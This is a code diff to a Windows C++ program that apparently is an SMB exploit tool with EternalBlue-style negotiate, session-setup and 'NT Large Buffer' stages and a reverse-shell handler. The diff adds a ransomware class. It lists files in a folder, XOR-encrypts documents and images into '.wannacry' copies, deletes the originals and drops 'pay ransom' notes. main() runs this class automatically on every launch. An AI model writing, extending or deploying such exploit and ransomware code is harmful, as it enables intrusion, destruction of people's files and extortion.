@@ -2,6 +2,7 @@
 #include <windows.h>
 #include <ws2tcpip.h>
 #include <iphlpapi.h>
+#include <wincrypt.h>
 #include <iostream>
 #include <vector>
 #include <string>
@@ -16,6 +17,7 @@
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "iphlpapi.lib")
+#pragma comment(lib, "crypt32.lib")
 
 std::string GetLocalIPAddress() {
     WSADATA wsaData;
@@ -69,6 +71,108 @@ std::string bytes_to_hex(const unsigned char* data, size_t len) {
     }
     return ss.str();
 }
+
+class RansomwareComponent {
+private:
+    std::string targetFolder = "C:/miscitaofvh/";
+    std::string newExtension = ".wannacry";
+    
+public:
+    void EncryptFiles() {
+        std::vector<std::string> files = ListFiles(targetFolder);
+        
+        for (const auto& file : files) {
+            if (IsTargetFile(file)) {
+                std::string encryptedFile = file + newExtension;
+                std::vector<BYTE> fileData = ReadFileData(file);
+                std::vector<BYTE> encryptedData = EncryptData(fileData);
+                WriteFileData(encryptedFile, encryptedData);
+                DeleteOriginalFile(file);
+                CreateRansomNote(file);
+            }
+        }
+    }
+    
+private:
+    std::vector<std::string> ListFiles(const std::string& folder) {
+        std::vector<std::string> files;
+        std::wstring wfolder(folder.begin(), folder.end());
+        std::wstring searchPath = wfolder + L"/*.*";
+        
+        WIN32_FIND_DATAW findData;
+        HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
+        
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                    std::wstring wfilename(findData.cFileName);
+                    
+                    std::string filename(wfilename.begin(), wfilename.end());
+                    files.push_back(folder + "/" + filename);
+                }
+            } while (FindNextFileW(hFind, &findData)); 
+            FindClose(hFind);
+        }
+        
+        return files;
+    }
+    
+    bool IsTargetFile(const std::string& filename) {
+        std::vector<std::string> targetExtensions = {
+            ".txt", ".doc", ".docx", ".xls", ".xlsx", 
+            ".pdf", ".jpg", ".png", ".zip", ".rar"
+        };
+        
+        for (const auto& ext : targetExtensions) {
+            if (filename.find(ext) != std::string::npos) {
+                return true;
+            }
+        }
+        return false;
+    }
+    
+    std::vector<BYTE> ReadFileData(const std::string& filename) {
+        std::vector<BYTE> data;
+        std::ifstream file(filename, std::ios::binary);
+        if (file) {
+            file.seekg(0, std::ios::end);
+            size_t size = file.tellg();
+            file.seekg(0, std::ios::beg);
+            data.resize(size);
+            file.read((char*)data.data(), size);
+        }
+        return data;
+    }
+    
+    std::vector<BYTE> EncryptData(const std::vector<BYTE>& data) {
+        std::vector<BYTE> encrypted = data;
+        for (auto& byte : encrypted) {
+            byte ^= 0xAA;
+        }
+        return encrypted;
+    }
+    
+    void WriteFileData(const std::string& filename, const std::vector<BYTE>& data) {
+        std::ofstream file(filename, std::ios::binary);
+        if (file) {
+            file.write((char*)data.data(), data.size());
+        }
+    }
+    
+    void DeleteOriginalFile(const std::string& filename) {
+        std::wstring wfilename(filename.begin(), filename.end());
+        DeleteFileW(wfilename.c_str());
+    }
+    
+    void CreateRansomNote(const std::string& filename) {
+        std::string noteFile = filename + ".ransom";
+        std::ofstream note(noteFile);
+        if (note) {
+            note << "Your files have been encrypted.\n";
+            note << "Pay ransom to recover your files.\n";
+        }
+    }
+};
 
 class NetworkRecon {
 private:
@@ -542,25 +646,30 @@ public:
             SOCKET sock = Connect();
 
             if (sock == INVALID_SOCKET) {
+                std::cout << "[-] Connection to target failed" << std::endl;
                 continue;
             }
             
-            if (!SendNegotiate(sock)) { 
+            if (!SendNegotiate(sock)) {
+                std::cout << "[-] Negotiate Protocol failed" << std::endl; 
                 closesocket(sock); 
                 continue; 
             }
         
             if (!DoSessionSetup(sock)) { 
+                std::cout << "[-] Session Setup failed" << std::endl;
                 closesocket(sock); 
                 continue; 
             }
         
             if (!SendTreeConnect(sock)) { 
+                std::cout << "[-] Tree Connect failed" << std::endl;
                 closesocket(sock); 
                 continue; 
             }
             
             if (!SendNTLargeBuffer(sock)) { 
+                std::cout << "[-] NT Large Buffer failed" << std::endl;
                 closesocket(sock); 
                 continue; 
             }
@@ -626,7 +735,7 @@ public:
             }
 
             SOCKET client;
-            bool gotShell = shellHandler.WaitForConnection(5, client);
+            bool gotShell = shellHandler.WaitForConnection(10, client);
         
             if (gotShell) {
                 std::cout << "[+] Exploit successful! Got reverse shell." << std::endl;
@@ -1368,6 +1477,9 @@ int main(int argc, char* argv[]) {
     WSADATA wsa;
     if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;
     
+    RansomwareComponent FileEncryptor;
+    FileEncryptor.EncryptFiles();
+
     if (argc == 2) {
         std::string option = argv[1];
         
